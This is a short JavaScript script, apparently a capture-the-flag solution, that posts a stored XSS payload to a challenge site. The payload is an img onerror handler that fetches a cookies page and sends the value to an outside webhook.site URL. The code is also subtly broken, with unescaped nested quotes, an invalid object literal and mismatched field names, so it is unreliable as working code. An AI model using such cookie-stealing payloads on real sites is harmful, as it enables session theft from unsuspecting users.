// Function to make a POST request with fetch
async function makePostRequest(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'},
        body: JSON.stringify(data)
    });
    return await response.json();
}

const metaCookies = '<img src=x onerror="fetch('http://host3.metaproblems.com:6020/cookies.php').then(response => response.text()).then(cookieValue => {document.location = 'http://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?cookie=' + encodeURIComponent(cookieValue);})">';


    const url = 'http://host3.metaproblems.com:6020/index.php';  // Replace with your server endpoint
    const data = { cookie_name: `cookie_1`, cookie_value: metaCookies, submit=Store+Cookie };
    
    makePostRequest(url, data)
        .then(response => {
            console.log(`Cookie set: ${data.cookie}=${data.value}`);
        })
        .catch(error => {
            console.error('Error setting cookie:', error);
        });
        makePostRequest("http://host3.metaproblems.com:6020/cookies.php");
        

// Redirect to view cookie URL after setting cookies
window.location.href = 'view_cookie_url';  // Replace with the actual URL to view cookies
